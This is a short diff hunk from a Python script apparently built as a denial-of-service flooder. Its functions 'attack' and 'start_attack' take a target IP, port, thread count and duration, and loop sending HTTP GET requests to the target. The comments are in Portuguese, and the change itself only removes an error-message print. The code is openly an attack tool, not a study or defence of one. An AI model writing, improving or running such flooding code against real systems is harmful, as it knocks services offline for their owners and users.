@@ -44,7 +44,6 @@ def attack(target_ip, target_port, timeout):
                 s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                 s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
         except socket.error as e:
-            print(f"Erro ao conectar: {e}")
             break  # Encerra o loop em caso de erro
 
 def start_attack(target_ip, target_port, num_threads, duration, timeout):
